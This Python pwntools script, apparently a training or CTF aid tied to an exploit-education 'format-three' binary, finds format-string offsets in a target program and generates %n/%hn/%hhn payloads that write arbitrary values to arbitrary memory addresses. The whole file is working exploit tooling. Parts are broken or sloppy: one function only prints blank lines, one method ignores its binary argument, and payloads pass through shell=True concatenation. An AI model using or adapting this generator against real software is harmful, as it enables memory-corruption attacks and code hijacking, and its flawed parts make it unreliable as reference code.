import subprocess
from pwn import *
import sys


def plain_print(inp):
    if type(inp) == str:
        inp = inp.encode()
        sys.stdout.buffer.write(inp)
    elif type(inp) == bytes:
        sys.stdout.buffer.write(inp)

def sanitize_where(where):
    if type(where) == int:
        addr = where
    elif type(where) == str:
        addr = int(where ,16)
    else:
        print("ERROR")
        exit()
    return addr


def tbin(binary, pld,  method="stdin"):
    if method == "stdin":
        res = subprocess.check_output(
            "python2 -c 'print " + '"' + pld + '"' + "'" + "|" + binary, shell=True)
    elif method == "args":
        res = subprocess.check_output(binary + " '" + pld + "'", shell=True)
    elif method == "env":
        res = subprocess.check_output(
            "python2 -c 'print " + '"' + pld + '"' + "'" + "| ./bin/format-three", shell=True)
    return res


# Detects format string vuln when our input is reflected in output
# it returns the parameter of the printf where our input resides
def reflector(binary, attempts=100, method="stdin"):
    out = []
    for x in range(attempts):
        pld = "A"*8 + " %" + str(x) + "$p"
        res = tbin(binary, pld, method).decode('utf-8')
        if "4141414141414141" in res:
            out.append(x)
    return out


def whr_pss(inp):
    HX = inp
    if type(inp) == str:
        HX = int(HX, 16)

    HX = hex(HX)[2:]

    HX_len = len(HX)//2
    while (HX_len % 4 != 0):
        HX = '00' + HX
        HX_len = len(HX) // 2

    for x in range(HX_len):
        arr = chr(int(HX[2*x:2*(x+1)], 16))
        print()


# Format string design
# cprinter writer padding address

def cprinter(what):
    for x in range(len(what)):
        if x != 0:
            what[-x] = what[-x] - what[-x-1]

    for x in range(len(what)):
        if what[x] < 10:
            what[x] = "A" * what[x]
        else:
            what[x] = "%" + str( what[x] ) + "x"
    return what


def writer(c2print, steps, param_offset):
    pld = ""
    if steps == 4:
        bytes2write = ""
    elif steps == 2:
        bytes2write = "h"
    elif steps == 1:
        bytes2write = "hh"


    len_c2print = 0
    for x in c2print:
        len_c2print += len(x)

    expected_length = len_c2print + \
            len(c2print) * (len(bytes2write) + 3 + len(str(param_offset)))

    while True :
        padding = ""
        next_param = param_offset
        while(expected_length % 8 != 0):
            padding += "A"
            expected_length +=1

        fmt = []
        for x in c2print:
            fmt.append("%" + str(next_param + expected_length // 8) + "$" + bytes2write + "n")
            next_param += 1

        pld = ""
        for x in range(len(fmt)):
            pld = pld + c2print[x] + fmt[x]
        pld += padding

        if expected_length != len(pld):
            expected_length = len(pld) - len(padding)
        else:
            return pld


def write(what, where, param_offset, context="compact"):
    addr = sanitize_where(where) 

    if context == "safe":
        steps= 1
    elif  context=="risky" or int(what,16) < 0xffff:
        steps = 4       # 1, 2, 4
    else:
        steps = 2



    hx = what[2:]
    while ((len(hx)//2) % 4 != 0):
        hx = "00" + hx
    hx_len = len(hx)//2
    split_bytes = []

    for x in range(hx_len//steps):
        byte = int("0x" + hx[2 * x * steps: 2 * (x + 1) * steps], 16)
        split_bytes.append(byte)

    order = []
    final = sorted(split_bytes)
    for x in final:
        order.append(split_bytes.index(x))
        split_bytes[split_bytes.index(x)] = "XX"


    # print(final)
    final = cprinter(final)

    fmt = writer(final, steps, param_offset)
    fmt = fmt.encode()

    for x in order:
        fmt += p64(addr + steps * (max(order) - x))

    return fmt


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()

    parser.add_argument("-w", "--write", help="Write to some location")
    parser.add_argument("-v", "--value", help="What to write")
    parser.add_argument("-l", "--loc", help="Where to write")
    parser.add_argument("-o", "--offset", help="Parameter offset for reflected input")
    parser.add_argument("-c", "--context", help="safe means stable, compact means small")

    parser.add_argument("-b", "--binary", help="Location of binary")
    parser.add_argument("-i", "--method", help="Method to interact with binary")
    parser.add_argument("-a", "--attempts", help="Number of offsets to test")
    parser.add_argument("-p", "--preinput", help="input required to reach printf")

    args = parser.parse_args()

    if args.write:
        pld = write(args.value, args.loc, int(args.offset), args.context)
        # print(len(pld))
        plain_print(pld)
    elif args.binary:
        if args.attempts:
            attempts = int(args.attempts)
        else:
            attempts = 100
        print(reflector(args.binary, attempts, args.method))

